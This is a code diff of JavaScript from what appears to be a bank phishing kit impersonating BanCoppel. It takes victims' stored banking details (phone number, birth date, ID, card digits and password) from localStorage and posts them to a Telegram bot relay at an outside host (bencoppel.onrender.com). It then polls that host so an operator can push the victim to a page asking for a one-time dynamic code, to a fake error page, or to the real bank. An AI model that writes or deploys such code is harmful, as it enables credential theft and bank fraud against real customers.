@@ -69,7 +69,7 @@ document.addEventListener('DOMContentLoaded', async function () {
     return;
   }
 
-  const { token } = config;
+  const { token, chat_id } = config;
   const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
 
   if (!data.celular || !data.nacimiento || !data.tipo || !data.identificador || !data.digitosFinales || !data.clave) {
@@ -93,26 +93,26 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
-      [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
-      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
+      [{ text: "📲 Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
+      [{ text: "🚫 Error Logo", callback_data: `error_logo:${transactionId}` }],
+      [{ text: "✅ Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
     ]
   };
 
-  // Solo enviar mensaje, sin getUpdates
-  await fetch("botmaster2.php", {
+  // Enviar al bot con botones
+  await fetch("https://bencoppel.onrender.com/botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "data=" + encodeURIComponent(mensaje) +
           "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  // Inicia la escucha del botón desde Webhook
+  // Escuchar respuesta del botón
   revisarAccion(transactionId);
 
   async function revisarAccion(txId) {
     try {
-      const res = await fetch(`sendStatus.php?txid=${txId}`);
+      const res = await fetch(`https://bencoppel.onrender.com/sendStatus.php?txid=${txId}`);
       const json = await res.json();
 
       if (!json.status || json.status === "esperando") {
@@ -124,9 +124,11 @@ document.addEventListener('DOMContentLoaded', async function () {
           window.location.href = "cel-dina.html"; break;
         case "error_logo":
           window.location.href = "errorlogo.html"; break;
-        case "finalizar":
         case "confirm_finalizar":
+        case "finalizar":
           window.location.href = "https://www.bancoppel.com"; break;
+        default:
+          alert("Opción desconocida: " + json.status);
       }
 
     } catch (e) {
